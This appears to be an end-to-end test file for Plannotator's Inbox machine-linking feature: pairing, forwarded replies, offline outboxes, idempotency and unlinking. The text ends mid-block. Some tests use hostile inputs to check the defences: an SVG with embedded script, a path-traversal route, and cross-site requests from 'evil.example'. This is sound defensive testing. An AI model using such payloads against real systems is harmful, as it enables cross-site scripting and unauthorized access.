/**
 * Linked machines, end to end (docs/agent-guides/inbox-machines.md; PLAN.md
 * Phase 1). Three real Inboxes, each `plannotator inbox --background` (the CLI
 * from source, or the compiled binary when PLANNOTATOR_INBOX_TEST_BINARY names
 * one) under its own temp HOME and PLANNOTATOR_DATA_DIR, with Phones OFF (as
 * released), PLANNOTATOR_INBOX_CONNECT=0, PLANNOTATOR_UPDATE_CHECK=0 and no
 * browser. They link through the real CLI pairing. The transport is the
 * tailnet one (HTTP to the other Inbox's device door); on one computer its
 * address is the other Inbox's loopback port, given with `--address` and
 * `--back`. A `tailscale` stand-in on each PATH records any call and fails,
 * and the test asserts nothing ever ran it.
 *
 *  1. B offers, A links both ways; each sees the other online.
 *  2. An agent on B asks; A's merged list and event stream show it; the
 *     person answers from A through the forward; B's agent reads the answer
 *     (read_thread over MCP).
 *  3. B sleeps (its Inbox killed): A shows it offline, keeps its rows, and
 *     holds the answer; B starts again, and the answer lands exactly once.
 *  4. Late words: an agent writes again after the person read; the held
 *     reply is refused by `seen_through_seq` (rule 11), with a notice.
 *  5. No echo with links both ways: C links with B only; every view holds
 *     each thread once, and A never sees C's thread; a machine's token asking
 *     the merged view is refused.
 *  6. Unlink removes both sides, revokes both tokens, and tells about a
 *     write still held; a machine asleep during Unlink cleans up at its next
 *     contact.
 */
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Client, StreamableHTTPClientTransport } from "@modelcontextprotocol/client";
import type { TailscaleRunner } from "@plannotator/shared/tailscale";
import { InboxStore } from "@plannotator/shared/inbox/store";
import { InboxLinks } from "./inbox-links";
import { heldWords } from "../inbox/api";
import { startInboxServer } from "./inbox";
import { machineHeldWords } from "./inbox-machines";
import { createInboxDevices, takeDownInboxTailnet, UNLINKED_REFUSAL_KEPT_MS } from "./inbox-devices";
import { readTailnetDoorRecord, writeTailnetDoorRecord } from "./inbox-tailnet-door";
import {
  createInboxWorld,
  destroyInboxWorld,
  registry,
  removeStubbedHtml,
  stopInbox,
  stubBuiltHtml,
  waitFor,
  worldEnv,
  type InboxWorld,
} from "../../tests/helpers/inbox-world";

type Json = Record<string, any>;

const SESSION = "ses_machines_e2e";

interface Machine {
  w: InboxWorld;
  name: string;
  id: string;
  calls: string;
}

const env = (m: Machine) => ({ ...(process.env as Record<string, string>), ...worldEnv(m.w), PLANNOTATOR_UPDATE_CHECK: "0" });
const base = (m: Machine) => `http://127.0.0.1:${registry(m.w).port}`;

function cli(m: Machine, ...args: string[]): { code: number; out: string; err: string } {
  const run = Bun.spawnSync([join(m.w.bin, "plannotator"), "inbox", ...args], { env: env(m), cwd: m.w.root });
  return { code: run.exitCode ?? -1, out: run.stdout.toString(), err: run.stderr.toString() };
}

function start(m: Machine): void {
  const run = cli(m, "--background");
  if (run.code !== 0) throw new Error(`inbox --background failed: ${run.err}`);
}

async function getJson(m: Machine, path: string): Promise<Json> {
  const response = await fetch(`${base(m)}${path}`);
  return (await response.json()) as Json;
}

/** A write as the window sends it: same origin, this Inbox's page session. */
async function windowPost(m: Machine, path: string, body: Json): Promise<Response> {
  const health = await getJson(m, "/api/inbox/health");
  return fetch(`${base(m)}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Origin: base(m) },
    body: JSON.stringify({ serverSession: health.serverSession, ...body }),
  });
}

const machinesOf = async (m: Machine) => (await getJson(m, "/api/inbox/machines")).machines as Json[];
const stateOf = async (m: Machine, other: Machine) => (await machinesOf(m)).find((x) => x.id === other.id)?.state ?? null;
const mergedRows = async (m: Machine) =>
  ((await getJson(m, "/api/inbox/threads?machines=1")).sections as Json[]).flatMap((section) => section.threads as Json[]);
const linksFile = (m: Machine) => JSON.parse(readFileSync(join(m.w.dataDir, "inbox", "machines.json"), "utf8")) as Json;

/** Link `from` to `to` through the CLI, as the person does: the code on `to`, pasted on `from`. */
function link(from: Machine, to: Machine): string {
  const offered = cli(to, "link", "--offer");
  expect(offered.code).toBe(0);
  const code = offered.out.trim();
  expect(code).toStartWith("plannotator://link?v=1&id=");
  const linked = cli(from, "link", code, "--address", base(to), "--back", base(from));
  if (linked.code !== 0) throw new Error(`link failed: ${linked.err}`);
  expect(linked.out).toContain("both ways");
  return code;
}

/** An agent session on a machine: send_message and read_thread over the real MCP client. */
async function agentOn(m: Machine) {
  const client = new Client({ name: "inbox-machines-e2e", version: "1.0.0" });
  await client.connect(new StreamableHTTPClientTransport(new URL(`${base(m)}/mcp`)));
  return {
    client,
    send: async (body: string, extra: Json = {}) =>
      (
        (await client.callTool({
          name: "send_message",
          arguments: { project_path: m.w.project, agent_session: SESSION, agent_name: "Claude Code", agent_host: "claude-code", body, ...extra },
        })) as { structuredContent: { thread_id: string; message_id: string } }
      ).structuredContent,
    /** The person's newest message in the thread, as this session reads it. */
    lastReply: async (threadId: string) => {
      const read = (await client.callTool({ name: "read_thread", arguments: { thread_id: threadId, agent_session: SESSION } })) as {
        structuredContent: { thread: { messages: { id: string; body: string; author: { kind: string } }[] } };
      };
      return read.structuredContent.thread.messages.findLast((m) => m.author.kind === "person");
    },
  };
}

const QUESTION = (n: number) => [`Refund webhook, question ${n}.`, "", ":::question", `Retry the 409, case ${n}?`, "", "- [ ] Retry", "- [ ] Alert", ":::"].join("\n");

/** Read the merged event stream of a machine until `want` is seen. `subscribed`: called at its first `machines` snapshot (sent once the stream listens). */
async function streamUntil(
  m: Machine,
  want: (event: string, data: Json) => boolean,
  timeoutMs = 15_000,
  subscribed: () => void = () => {},
): Promise<{ event: string; data: Json }[]> {
  const abort = new AbortController();
  const seen: { event: string; data: Json }[] = [];
  const timer = setTimeout(() => abort.abort(), timeoutMs);
  try {
    const response = await fetch(`${base(m)}/api/inbox/events?machines=1`, { signal: abort.signal });
    const decoder = new TextDecoder();
    let buffer = "";
    for await (const chunk of response.body as unknown as AsyncIterable<Uint8Array>) {
      buffer += decoder.decode(chunk, { stream: true });
      let cut: number;
      while ((cut = buffer.indexOf("\n\n")) >= 0) {
        const frame = buffer.slice(0, cut);
        buffer = buffer.slice(cut + 2);
        const event = /^event: (.+)$/m.exec(frame)?.[1] ?? "message";
        const data = /^data: (.+)$/m.exec(frame)?.[1];
        if (!data) continue;
        const parsed = { event, data: JSON.parse(data) as Json, id: /^id: /m.test(frame) };
        // Other machines' frames never carry an id: the local seq and Last-Event-ID stay this Inbox's.
        if (event === "machine" || event === "machines" || event === "outbox") expect(parsed.id).toBe(false);
        seen.push(parsed);
        if (event === "machines") subscribed();
        if (want(event, parsed.data)) return seen;
      }
    }
  } catch {
    // Timed out: the caller's expectation fails below.
  } finally {
    clearTimeout(timer);
    abort.abort();
  }
  return seen;
}

describe("linked machines, on three real Inboxes", () => {
  let stubs: string[] = [];
  const machines: Machine[] = [];
  let A: Machine;
  let B: Machine;
  let C: Machine;

  beforeAll(async () => {
    stubs = stubBuiltHtml();
    for (const name of ["a", "b", "c"]) {
      const w = createInboxWorld(`plannotator-machines-${name}-`, `machine-${name}`, "machines");
      const calls = join(w.root, "tailscale-calls.txt");
      // Never the real tailscale: a stand-in that records a call and fails.
      writeFileSync(join(w.bin, "tailscale"), `#!/bin/sh\necho "tailscale $*" >> '${calls}'\nexit 1\n`);
      chmodSync(join(w.bin, "tailscale"), 0o755);
      const m: Machine = { w, name, id: "", calls };
      start(m);
      machines.push(m);
    }
    [A, B, C] = machines as [Machine, Machine, Machine];
    for (const m of machines) {
      // An Inbox that never linked keeps no machines file and no outbox folder.
      expect(existsSync(join(m.w.dataDir, "inbox", "machines.json"))).toBe(false);
      expect(existsSync(join(m.w.dataDir, "inbox", "outbox"))).toBe(false);
    }
    for (const m of machines) m.id = (await getJson(m, "/api/inbox/health")).inbox_id as string;
    // Never linked, Phones off: any device request is the unknown route it always was.
    expect((await fetch(`${base(A)}/api/inbox/device/health`, { headers: { Authorization: "Bearer tok_x" } })).status).toBe(404);
  }, 60_000);

  afterAll(async () => {
    for (const m of machines) {
      // Rule: nothing here may change the system's Tailscale.
      expect(existsSync(m.calls)).toBe(false);
      await destroyInboxWorld(m.w);
    }
    removeStubbedHtml(stubs);
  });

  test("1. one code links two machines both ways, with Phones off", async () => {
    expect((await getJson(B, "/api/inbox/health")).inbox_id).toBe(B.id);
    expect((await getJson(B, "/api/inbox/health")).machine_links).toBe(1);
    link(A, B);
    await waitFor("A sees B online", async () => (await stateOf(A, B)) === "online");
    await waitFor("B sees A online", async () => (await stateOf(B, A)) === "online");
    expect(linksFile(A).links.map((l: Json) => l.id)).toEqual([B.id]);
    expect(linksFile(B).links.map((l: Json) => l.id)).toEqual([A.id]);
    expect((await machinesOf(A)).find((x) => x.id === B.id)!.both_ways).toBe(true);
    // The token is kept 0600 and never shown by a route.
    expect(readFileSync(join(A.w.dataDir, "inbox", "machines.json")).length).toBeGreaterThan(0);
    expect(JSON.stringify(await machinesOf(A))).not.toContain("tok_");
    // Phones stay off: no phone pairing, no phone routes.
    expect((await windowPost(A, "/api/inbox/pairing", {})).status).toBe(404);
    // The CLI lists it.
    expect(cli(A, "link", "--list").out).toContain(B.id);

    // Re-pairing (rule 19) replaces the link on both sides, and the old tokens die on both doors.
    const oldAB = linksFile(A).links[0].token as string;
    const oldBA = linksFile(B).links[0].token as string;
    const code = link(A, B);
    expect(linksFile(A).links).toHaveLength(1);
    expect(linksFile(B).links).toHaveLength(1);
    for (const [m, token] of [
      [B, oldAB],
      [A, oldBA],
    ] as const) {
      const answer = await fetch(`${base(m)}/api/inbox/device/health`, { headers: { Authorization: `Bearer ${token}` } });
      expect(((await answer.json()) as Json).code).toBe("device_revoked");
    }
    await waitFor("A sees B online again", async () => (await stateOf(A, B)) === "online");
    await waitFor("B sees A online again", async () => (await stateOf(B, A)) === "online");
    // A code links once.
    const again = cli(A, "link", code, "--address", base(B), "--back", base(A));
    expect(again.code).toBe(1);
    expect(again.err).toContain("no longer open");
    // A link to this Inbox's own code is refused.
    const own = cli(A, "link", cli(A, "link", "--offer").out.trim(), "--address", base(A), "--back", base(A));
    expect(own.code).toBe(1);
    expect(own.err).toContain("own link code");
  }, 60_000);

  test("2. an agent on B asks; the person answers from A; B's agent reads the answer", async () => {
    const agent = await agentOn(B);
    try {
      // A's merged stream (opened first, as a window holds it) raises B's question as a live record of B's.
      // The stream may outrun the send, so stop on B's first live message (a project record comes before it), not on `sent`.
      let listening!: () => void;
      const subscribed = new Promise<void>((resolve) => (listening = resolve));
      const watching = streamUntil(
        A,
        (event, data) => event === "machine" && data.machine === B.id && data.live === true && data.record?.message?.id !== undefined,
        15_000,
        listening,
      );
      await subscribed;
      const sent = await agent.send(QUESTION(1), { thread: "case-1" });
      const frames = await watching;
      expect(frames.find((f) => f.event === "machines")).toBeDefined();
      expect(frames.some((f) => f.event === "machine" && f.data.record?.message?.id === sent.message_id)).toBe(true);
      const row = await waitFor("B's thread in A's merged list", async () => (await mergedRows(A)).find((r) => r.thread_id === sent.thread_id));
      expect(row.machine).toBe(B.id);
      // A holds a cursor of B's list (the window's cue to read the merged list again); A's own has none.
      const views = await machinesOf(A);
      expect(typeof views.find((x) => x.id === B.id)!.list_cursor).toBe("number");
      expect(views.find((x) => x.self)!.list_cursor).toBeNull();
      // Both keep snoozes, and A says so of B (its list said so): A's window offers Snooze on B's rows.
      expect(views.map((x) => x.snoozes)).toEqual([true, true]);
      // A's own list (no machines=1) stays A's own.
      expect(((await getJson(A, "/api/inbox/threads")).sections as Json[]).flatMap((s) => s.threads).some((r: Json) => r.thread_id === sent.thread_id)).toBe(false);
      // The person opens the thread from A (a read forwarded to B), then presses Send.
      const opened = await getJson(A, `/api/inbox/m/${B.id}/threads/${sent.thread_id}`);
      expect(opened.thread.messages[0].id).toBe(sent.message_id);
      const answered = await windowPost(A, `/api/inbox/m/${B.id}/messages/${sent.message_id}/reply`, {
        idempotency_key: "window-answer-1",
        words: "Retry with the same key.",
        seen_through_seq: opened.cursor,
      });
      expect(answered.status).toBe(200);
      expect(answered.headers.get("x-plannotator-outbox")).toBe("delivered");
      const reply = (await answered.json()) as Json;
      const read = await agent.lastReply(sent.thread_id);
      expect(read!.body).toContain("Retry with the same key.");
      expect(read!.id).toBe(reply.reply.id);
      // A retried Send (the page lost the answer) answers the same reply and writes nothing.
      const again = await windowPost(A, `/api/inbox/m/${B.id}/messages/${sent.message_id}/reply`, {
        idempotency_key: "window-answer-1",
        words: "Retry with the same key.",
        seen_through_seq: opened.cursor,
      });
      expect(again.status).toBe(200);
      expect(again.headers.get("idempotent-replayed")).toBe("true");
      expect(((await again.json()) as Json).reply.id).toBe(reply.reply.id);
      const thread = await getJson(B, `/api/inbox/threads/${sent.thread_id}`);
      expect(thread.thread.messages.filter((m: Json) => m.author.kind === "person")).toHaveLength(1);

      // An SVG on B, opened from A: the forward keeps B's sandbox, so its script never runs on A's origin.
      const svg = join(B.w.project, "diagram.svg");
      writeFileSync(svg, '<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"><script>parent.postMessage("ran","*")</script><rect width="4" height="4"/></svg>');
      const drawn = await agent.send("The diagram.", { thread: "case-1", attachments: [svg] });
      const withFile = await getJson(A, `/api/inbox/m/${B.id}/threads/${drawn.thread_id}`);
      const attachment = (withFile.thread.messages as Json[]).find((m) => m.id === drawn.message_id)!.attachments[0] as Json;
      const image = await fetch(`${base(A)}/api/inbox/m/${B.id}/attachments/${attachment.id}/image`);
      expect(image.status).toBe(200);
      expect(image.headers.get("content-type")).toContain("image/svg+xml");
      expect(image.headers.get("content-security-policy")).toStartWith("sandbox");
      expect(image.headers.get("cross-origin-resource-policy")).toBe("same-origin");
      expect(image.headers.get("x-content-type-options")).toBe("nosniff");
      const download = await fetch(`${base(A)}/api/inbox/m/${B.id}/attachments/${attachment.id}/download`);
      expect(download.status).toBe(200);
      expect(download.headers.get("content-security-policy")).toStartWith("sandbox");
      await download.arrayBuffer();

      // A file sent to B from A's window: never held, streamed through by its route; A's page session is checked here, never sent on.
      const { serverSession } = await getJson(A, "/api/inbox/health");
      const upload = (session: string) =>
        fetch(`${base(A)}/api/inbox/m/${B.id}/uploads?name=pasted-text-2026-11-01-2110.txt&idempotency_key=window-upload-${session.slice(0, 4)}&serverSession=${session}`, {
          method: "POST",
          headers: { "Content-Type": "text/plain", Origin: base(A) },
          body: "notes for B",
        });
      expect((await upload("0".repeat(32))).status).toBe(409);
      const uploaded = await upload(serverSession);
      expect(uploaded.status).toBe(200);
      expect(uploaded.headers.get("x-plannotator-outbox")).toBeNull();
      const upload_ = ((await uploaded.json()) as Json).upload as Json;
      expect(upload_).toBeDefined();
      // Its words read back from A's window (a long paste put back, approval "inbox-paste-attachment"): forwarded to B,
      // whose pending upload it is; A holds no such upload.
      const text = await fetch(`${base(A)}/api/inbox/m/${B.id}/uploads/${upload_.upload_id}/text`);
      expect(text.status).toBe(200);
      expect(((await text.json()) as Json).text).toBe("notes for B");
      expect((await fetch(`${base(A)}/api/inbox/uploads/${upload_.upload_id}/text`)).status).toBe(404);
    } finally {
      await agent.client.close().catch(() => {});
    }
  }, 90_000);

  test("3. B asleep: its rows stay, the answer is held, and lands exactly once when B is back", async () => {
    const agent = await agentOn(B);
    const sent = await agent.send(QUESTION(2), { thread: "case-2" });
    await waitFor("A has B's new row", async () => (await mergedRows(A)).some((r) => r.thread_id === sent.thread_id));
    const opened = await getJson(A, `/api/inbox/m/${B.id}/threads/${sent.thread_id}`);
    await agent.client.close().catch(() => {});

    const before = registry(B.w).port;
    await stopInbox(B.w);
    await waitFor("A sees B offline", async () => (await stateOf(A, B)) === "offline", 30_000);
    // Its rows stay, from the link's memory (rule 2: nothing on disk).
    expect((await mergedRows(A)).some((r) => r.thread_id === sent.thread_id && r.machine === B.id)).toBe(true);
    // A read of a sleeping machine says so.
    const read = await fetch(`${base(A)}/api/inbox/m/${B.id}/threads/${sent.thread_id}`);
    expect(read.status).toBe(503);
    expect(((await read.json()) as Json).code).toBe("machine_offline");

    // The person answers anyway: held, "Will send when B is back" (rule 12: never "delivered" before B says so).
    const held = await windowPost(A, `/api/inbox/m/${B.id}/messages/${sent.message_id}/reply`, {
      idempotency_key: "window-held-1",
      words: "Alert, do not retry.",
      seen_through_seq: opened.cursor,
    });
    expect(held.status).toBe(202);
    const heldBody = (await held.json()) as Json;
    expect(["queued", "sending"]).toContain(heldBody.outbox.state);
    expect(heldBody.machine.state).toBe("offline");
    const waitingList = await getJson(A, "/api/inbox/outbox");
    expect(waitingList.waiting.map((e: Json) => e.key)).toEqual(["window-held-1"]);
    // The same Send pressed again while B sleeps queues nothing new (rule 1).
    const twice = await windowPost(A, `/api/inbox/m/${B.id}/messages/${sent.message_id}/reply`, {
      idempotency_key: "window-held-1",
      words: "Alert, do not retry.",
      seen_through_seq: opened.cursor,
    });
    expect(twice.status).toBe(202);
    expect((await getJson(A, "/api/inbox/outbox")).waiting).toHaveLength(1);
    // The outbox is on A's disk, in its own file.
    expect(readFileSync(join(A.w.dataDir, "inbox", "outbox", `${B.id}.jsonl`), "utf8")).toContain("window-held-1");

    // B wakes: same port, same token, no re-pairing; A redials and flushes the outbox.
    start(B);
    expect(registry(B.w).port).toBe(before);
    await waitFor("A sees B online again", async () => (await stateOf(A, B)) === "online", 45_000);
    await waitFor("the held answer delivered", async () => (await getJson(A, "/api/inbox/outbox")).waiting.length === 0, 30_000);
    const thread = await getJson(B, `/api/inbox/threads/${sent.thread_id}`);
    const replies = thread.thread.messages.filter((m: Json) => m.author.kind === "person");
    expect(replies).toHaveLength(1);
    expect(replies[0].body).toContain("Alert, do not retry.");
    // The agent on B, back after the restart, reads the answer that waited.
    const back = await agentOn(B);
    try {
      expect((await back.lastReply(sent.thread_id))!.body).toContain("Alert, do not retry.");
    } finally {
      await back.client.close().catch(() => {});
    }
    // Another press of the same Send now answers the delivered reply, still one reply on B.
    const replay = await windowPost(A, `/api/inbox/m/${B.id}/messages/${sent.message_id}/reply`, {
      idempotency_key: "window-held-1",
      words: "Alert, do not retry.",
      seen_through_seq: opened.cursor,
    });
    expect(replay.status).toBe(200);
    expect((await getJson(B, `/api/inbox/threads/${sent.thread_id}`)).thread.messages.filter((m: Json) => m.author.kind === "person")).toHaveLength(1);
  }, 180_000);

  test("4. late words are refused by what the person saw (rule 11), and the person is told", async () => {
    const agent = await agentOn(B);
    try {
      const sent = await agent.send(QUESTION(3), { thread: "case-3" });
      await waitFor("A has the row", async () => (await mergedRows(A)).some((r) => r.thread_id === sent.thread_id));
      const opened = await getJson(A, `/api/inbox/m/${B.id}/threads/${sent.thread_id}`);
      // The agent writes again before the person's words land.
      await agent.send("Never mind, I found it: a new question follows.", { reply_to: sent.message_id });
      const late = await windowPost(A, `/api/inbox/m/${B.id}/messages/${sent.message_id}/reply`, {
        idempotency_key: "window-late-1",
        words: "Retry.",
        seen_through_seq: opened.cursor,
      });
      expect(late.status).toBe(409);
      expect(((await late.json()) as Json).code).toBe("thread_moved_on");
      const notices = (await getJson(A, "/api/inbox/outbox")).notices as Json[];
      expect(notices.find((n) => n.key === "window-late-1")?.notice.kind).toBe("refused");
      // A reply with no seen_through_seq is not held at all.
      const blind = await windowPost(A, `/api/inbox/m/${B.id}/messages/${sent.message_id}/reply`, { idempotency_key: "window-blind", words: "x" });
      expect(blind.status).toBe(422);
      // The route decides, never the Content-Type: a text/plain reply still meets rule 11 and goes through the outbox.
      const serverSession = (await getJson(A, "/api/inbox/health")).serverSession as string;
      const plain = (body: Json) =>
        fetch(`${base(A)}/api/inbox/m/${B.id}/messages/${sent.message_id}/reply`, {
          method: "POST",
          headers: { "Content-Type": "text/plain", Origin: base(A) },
          body: JSON.stringify({ serverSession, ...body }),
        });
      expect((await plain({ idempotency_key: "window-plain-blind", words: "x" })).status).toBe(422);
      const plainLate = await plain({ idempotency_key: "window-plain-late", words: "Retry.", seen_through_seq: opened.cursor });
      expect(plainLate.status).toBe(409);
      expect(plainLate.headers.get("x-plannotator-outbox")).toBe("refused");
      expect(((await plainLate.json()) as Json).code).toBe("thread_moved_on");
      const after = (await getJson(B, `/api/inbox/threads/${sent.thread_id}`)).thread.messages as Json[];
      expect(after.filter((m) => m.author.kind === "person"), JSON.stringify(after.map((m) => [m.author.kind, m.body.slice(0, 40)]))).toHaveLength(0);
    } finally {
      await agent.client.close().catch(() => {});
    }
  }, 60_000);

  test("5. no echo: C links with B only; each thread shows once, and A never sees C's", async () => {
    link(C, B);
    await waitFor("B sees C online", async () => (await stateOf(B, C)) === "online");
    await waitFor("C sees B online", async () => (await stateOf(C, B)) === "online");
    const onA = await agentOn(A);
    const onC = await agentOn(C);
    try {
      const a = await onA.send("A's own thread.");
      const c = await onC.send("C's own thread.");
      await waitFor("B shows A's and C's threads", async () => {
        const rows = await mergedRows(B);
        return rows.some((r) => r.thread_id === a.thread_id) && rows.some((r) => r.thread_id === c.thread_id);
      });
      await waitFor("C shows A? never; C shows B's", async () => (await mergedRows(C)).some((r) => r.machine === B.id));
      // A resync in both directions (each side's link redials) must not echo either.
      await stopInbox(B.w);
      await waitFor("A sees B offline", async () => (await stateOf(A, B)) === "offline", 30_000);
      start(B);
      await waitFor("A sees B back", async () => (await stateOf(A, B)) === "online", 45_000);
      await waitFor("C sees B back", async () => (await stateOf(C, B)) === "online", 45_000);
      await waitFor("B sees A and C back", async () => (await stateOf(B, A)) === "online" && (await stateOf(B, C)) === "online", 45_000);
      for (const m of [A, B, C]) {
        const rows = await mergedRows(m);
        const ids = rows.map((r) => r.thread_id);
        expect(new Set(ids).size).toBe(ids.length);
        for (const row of rows) expect([A.id, B.id, C.id]).toContain(row.machine);
      }
      const onAView = await mergedRows(A);
      expect(onAView.some((r) => r.thread_id === c.thread_id)).toBe(false);
      expect(onAView.every((r) => r.machine === A.id || r.machine === B.id)).toBe(true);
      expect((await mergedRows(C)).some((r) => r.thread_id === a.thread_id)).toBe(false);
      // The door refuses the merged view to a machine's token: echo is impossible by construction.
      const token = linksFile(A).links.find((l: Json) => l.id === B.id).token as string;
      const asked = await fetch(`${base(B)}/api/inbox/device/threads?machines=1`, { headers: { Authorization: `Bearer ${token}` } });
      expect(asked.status).toBe(403);
      expect(((await asked.json()) as Json).code).toBe("machines_view_refused");
      const events = await fetch(`${base(B)}/api/inbox/device/events?machines=1`, { headers: { Authorization: `Bearer ${token}` } });
      expect(events.status).toBe(403);
      // The forward never steps out of the far door, and never forwards the event stream.
      for (const route of ["threads%2F..%2Fhealth", "events"]) {
        const refused = await fetch(`${base(A)}/api/inbox/m/${B.id}/${route}`);
        expect(refused.status).toBe(404);
      }
      // Another site's page cannot read another machine's threads through this Inbox.
      const crossSite = await fetch(`${base(A)}/api/inbox/m/${B.id}/threads`, { headers: { Origin: "https://evil.example", "Sec-Fetch-Site": "cross-site" } });
      expect(crossSite.status).toBe(403);
    } finally {
      await onA.client.close().catch(() => {});
      await onC.client.close().catch(() => {});
    }
  }, 240_000);

  test("6. Unlink removes both sides and revokes both tokens; a held write becomes a notice; a sleeping machine cleans up at its next contact", async () => {
    const tokenAB = linksFile(A).links.find((l: Json) => l.id === B.id).token as string;
    const tokenBA = linksFile(B).links.find((l: Json) => l.id === A.id).token as string;
    // While a machine links here, a token this door does not know (a machine that reinstalled) is told to re-pair, not 404.
    const stranger = await fetch(`${base(A)}/api/inbox/device/health`, { headers: { Authorization: "Bearer tok_from_before_a_reinstall" } });
    expect(stranger.status).toBe(401);
    expect(((await stranger.json()) as Json).code).toBe("device_token_invalid");
    // Both up: B unlinks C, and C hears it at once.
    const both = cli(B, "unlink", C.id);
    expect(both.code).toBe(0);
    expect(both.err).not.toContain("could not be reached");
    expect(linksFile(B).links.some((l: Json) => l.id === C.id)).toBe(false);
    await waitFor("C forgot B", async () => linksFile(C).links.length === 0);
    expect((await mergedRows(C)).some((r) => r.machine === B.id)).toBe(false);

    // B asleep: A holds a write for it, then A unlinks B (rule 4: the held write ends with "not delivered").
    const bRow = (await mergedRows(A)).find((r) => r.machine === B.id)!;
    await stopInbox(B.w);
    await waitFor("A sees B offline", async () => (await stateOf(A, B)) === "offline", 30_000);
    const held = await windowPost(A, `/api/inbox/m/${B.id}/threads/${bRow.thread_id}/seen`, { idempotency_key: "window-seen-1" });
    expect(held.status).toBe(202);
    const unlinked = cli(A, "unlink", B.id);
    expect(unlinked.code).toBe(0);
    expect(unlinked.err).toContain("could not be reached");
    expect(linksFile(A).links).toHaveLength(0);
    const outbox = await getJson(A, "/api/inbox/outbox");
    expect(outbox.waiting).toHaveLength(0);
    expect(outbox.notices.find((n: Json) => n.key === "window-seen-1")?.notice.kind).toBe("not_delivered");
    expect((await mergedRows(A)).some((r) => r.machine === B.id)).toBe(false);
    // B's token on A died at once.
    const early = await fetch(`${base(A)}/api/inbox/device/health`, { headers: { Authorization: `Bearer ${tokenBA}` } });
    expect(early.status).toBe(401);

    // B wakes: its link to A gets device_revoked and B removes its side, revoking A's token on B (rule 13).
    start(B);
    await waitFor("B forgot A at its next contact", async () => linksFile(B).links.length === 0, 45_000);
    for (const [m, token] of [
      [B, tokenAB],
      [A, tokenBA],
    ] as const) {
      const answer = await fetch(`${base(m)}/api/inbox/device/health`, { headers: { Authorization: `Bearer ${token}` } });
      expect(answer.status).toBe(401);
      expect(((await answer.json()) as Json).code).toBe("device_revoked");
    }
  }, 240_000);
});

/** Tailscale's serve config, kept by a scripted CLI through the seam the Inbox runs the real one with (as inbox-devices.test.ts does). */
function scriptedTailscale() {
  const serve = new Map<number, string>();
  const calls: string[][] = [];
  const run: TailscaleRunner = (args) => {
    calls.push(args);
    const ok = (stdout = "") => ({ status: 0, stdout, stderr: "" });
    if (args[1] === "status") {
      if (serve.size === 0) return ok("{}");
      const TCP = Object.fromEntries([...serve.keys()].map((p) => [String(p), { HTTPS: true }]));
      const Web = Object.fromEntries([...serve].map(([p, proxy]) => [`laptop.tail0000.ts.net:${p}`, { Handlers: { "/": { Proxy: proxy } } }]));
      return ok(JSON.stringify({ TCP, Web }));
    }
    const httpsPort = Number(/--https=(\d+)/.exec(args.join(" "))![1]);
    if (args.includes("off")) {
      serve.delete(httpsPort);
      return ok();
    }
    serve.set(httpsPort, args.at(-1)!);
    return ok(`Available within your tailnet:\n\nhttps://laptop.tail0000.ts.net:${httpsPort}/\n|-- proxy ${args.at(-1)}\n`);
  };
  /** The calls that published or took down the door's port 8443, in order. */
  const doorCalls = () => calls.filter((args) => args.includes("--https=8443")).map((args) => (args.includes("off") ? "off" : "on"));
  return { serve, run, doorCalls, calls };
}

describe("the tailnet door with Phones off, in process", () => {
  const roots: string[] = [];
  afterAll(() => {
    for (const root of roots) rmSync(root, { recursive: true, force: true });
  });
  const OTHER = "ibx_01K00000000000000000000000";
  const closedPort = () => {
    const probe = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: () => new Response() });
    const port = probe.port as number;
    probe.stop(true);
    return port;
  };
  const scratch = (prefix: string) => {
    const root = mkdtempSync(join(tmpdir(), prefix));
    roots.push(root);
    return join(root, "data");
  };
  const inboxJson = (dataDir: string) => JSON.parse(readFileSync(join(dataDir, "inbox", "inbox.json"), "utf8")) as Json;

  test("published only while a machine is linked: never for a saved switch alone, at start with a link, down after the last unlink", async () => {
    const dataDir = scratch("plannotator-machines-door-");
    const tailscale = scriptedTailscale();

    // A saved switch and no link: nothing is published.
    let inbox = await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: tailscale.run });
    inbox.stop();
    writeFileSync(join(dataDir, "inbox", "inbox.json"), JSON.stringify({ ...inboxJson(dataDir), tailnet: { https_port: 8443, door_port: closedPort() } }));
    inbox = await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: tailscale.run });
    expect(tailscale.doorCalls()).toEqual([]);
    expect(existsSync(join(dataDir, "inbox", "machines.json"))).toBe(false);
    inbox.stop();

    // A linked machine: the door is published at start.
    const link = { id: OTHER, name: "Mini", token: "tok_x", transport: { kind: "tailnet", url: `http://127.0.0.1:${closedPort()}` }, device_id: null, linked_at: "2026-10-30T00:00:00Z" };
    writeFileSync(join(dataDir, "inbox", "machines.json"), JSON.stringify({ v: 1, self: { id: "ibx_01K00000000000000000000001" }, links: [link] }), { mode: 0o600 });
    inbox = await startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: tailscale.run });
    try {
      expect(tailscale.doorCalls()).toEqual(["on"]);
      const doorUrl = tailscale.serve.get(8443)!;
      expect(doorUrl).not.toBe(`http://127.0.0.1:${inbox.port}`);
      // Through the tailnet's listener, a token this door does not know is told so (a reinstalled machine re-pairs) ...
      const unknown = await fetch(`${doorUrl}/api/inbox/device/health`, { headers: { Authorization: "Bearer tok_from_before_a_reinstall" } });
      expect(unknown.status).toBe(401);
      expect(((await unknown.json()) as Json).code).toBe("device_token_invalid");
      // ... while this computer's own port, with no machine paired here, stays the unknown route, Origin header or not.
      for (const headers of [{ Authorization: "Bearer tok_x" }, { Authorization: "Bearer tok_x", Origin: "https://evil.example" }]) {
        expect((await fetch(`http://127.0.0.1:${inbox.port}/api/inbox/device/health`, { headers })).status).toBe(404);
      }

      // The last unlink: the door comes down and the switch is cleared.
      const { serverSession } = (await (await fetch(`http://127.0.0.1:${inbox.port}/api/inbox/health`)).json()) as Json;
      const unlinked = await fetch(`http://127.0.0.1:${inbox.port}/api/inbox/machines/${OTHER}/unlink`, { method: "POST", body: JSON.stringify({ serverSession }) });
      expect(unlinked.status).toBe(200);
      expect(tailscale.doorCalls()).toEqual(["on", "off"]);
      expect(tailscale.serve.has(8443)).toBe(false);
      expect(inboxJson(dataDir).tailnet).toBeUndefined();
      expect(await fetch(`${doorUrl}/api/inbox/device/health`).then(() => "open", () => "closed")).toBe("closed");
    } finally {
